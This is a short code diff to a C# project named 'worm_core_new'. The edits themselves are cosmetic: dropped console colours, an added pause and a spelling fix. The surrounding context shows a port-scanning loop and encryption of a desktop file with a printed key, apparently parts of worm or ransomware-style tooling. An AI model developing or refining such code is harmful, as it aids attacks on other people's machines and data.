@@ -109,15 +109,17 @@ namespace worm_core_new
                         try
                         {
                             Scan.Connect(IP.Value, s);
-                            Console.WriteLine($"    [{s}] | OPEN", Color.Green);
+                            Console.WriteLine($"    [{s}] | OPEN");
                         }
                         catch
                         {
-                            Console.WriteLine($"    [{s}] | CLOSED", Color.Red);
+                            Console.WriteLine($"    [{s}] | CLOSED");
                         }
                     }
                 }
             }
+
+            Console.ReadLine();
         }
 
         private static int[] Ports = new int[]
@@ -152,7 +154,7 @@ namespace worm_core_new
                 sourceStream.CopyTo(cryptoStream);
             }
             encryptionKey = provider.Key;
-            Console.WriteLine("Encrytped file on desktop with key: " + System.Convert.ToBase64String(provider.Key) + "\n");
+            Console.WriteLine("Encrypted file on desktop with key: " + System.Convert.ToBase64String(provider.Key) + "\n");
 
         }
 
